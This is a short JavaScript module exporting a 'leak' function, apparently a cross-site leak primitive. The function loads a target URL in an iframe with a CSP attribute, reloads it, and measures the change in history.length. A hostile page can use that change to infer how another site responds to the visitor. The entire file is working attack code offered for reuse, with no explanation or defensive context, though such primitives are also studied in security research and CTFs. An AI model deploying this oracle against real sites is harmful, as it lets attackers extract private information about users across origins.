const leak = async(url, csp='default-src \'self\';') => {
    return new Promise((r)=> {
        let i = document.createElement('iframe')
        i.setAttribute('csp', csp)
        i.src = url
        
        let h0 = history.length

        // max history is 50 
        if(h0 > 48){
            throw new Error('History to long')
        }

        i.onload = () => {
            // overwrite onload
            i.onload = () => {
                let h1 = history.length
                i.remove()
                return r(h1 - h0)
            }

            // reload 
            i.src = url

        }
        document.body.append(i)
    })

}


export { leak }